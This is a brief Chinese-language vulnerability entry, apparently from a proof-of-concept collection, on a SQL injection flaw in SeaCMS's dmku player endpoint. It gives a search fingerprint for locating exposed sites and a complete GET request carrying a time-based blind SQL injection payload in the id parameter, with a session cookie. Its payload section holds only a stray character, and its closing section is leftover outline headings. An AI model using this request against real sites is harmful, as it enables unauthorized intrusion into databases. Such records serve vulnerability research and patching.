# SeaCMSdmku存在SQL注入漏洞

- **系统**：SeaCMSdmku　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="海洋CMS"`
- **请求**：`GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(3)))v)&type=list HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=hlfl5flck9q3ng1blehhv86s4s`

**请求体 / payload**
```
>
```

**其他**
- SeaCMS dmku存在SQL注入漏洞: + 一、漏洞概述
+ 二、网络测绘
+ 三、漏洞复现
---
- 网络测绘: ```plain
app="海洋CMS"
```